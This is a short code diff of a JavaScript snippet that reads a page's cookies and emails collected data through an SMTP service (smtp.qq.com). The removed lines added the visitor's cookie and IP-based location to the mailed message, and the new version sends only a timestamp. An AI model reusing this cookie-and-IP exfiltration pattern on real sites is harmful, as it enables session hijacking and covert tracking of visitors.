@@ -27,10 +27,8 @@ var now = new Date();
 var nowStr = now.format("yyyy-MM-dd hh:mm:ss");
 //cookie
 var s=document.cookie;
-//ip&归属地
-var ip=returnCitySN["cip"]+returnCitySN["cname"];
 //内容整合：
-   var text="时间："+nowStr+"______"+'\n'+"cookie:"+s+'\n'+"______"+"ip&归属："+ip;
+   var text="时间："+nowStr+"______";
 //邮件发送
 Email.send({
     Host : "smtp.qq.com",  //你所用邮箱的smtp地址
